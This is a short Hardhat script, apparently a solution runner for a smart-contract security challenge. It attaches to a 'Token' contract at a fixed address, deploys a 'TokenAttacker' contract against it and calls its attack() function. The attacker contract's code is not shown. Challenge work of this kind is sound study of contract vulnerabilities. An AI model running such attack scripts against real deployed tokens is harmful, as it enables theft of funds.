import { ethers } from "hardhat";

async function main() {
  const token = await ethers.getContractAt("Token", "0xA8aD69b88DED8c07bce5d243f1b512c53eeB279a");

  const TokenAttacker = await ethers.getContractFactory("TokenAttacker");
  const tokenAttacker = await TokenAttacker.deploy(token.address);

  const tx = await tokenAttacker.attack();
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
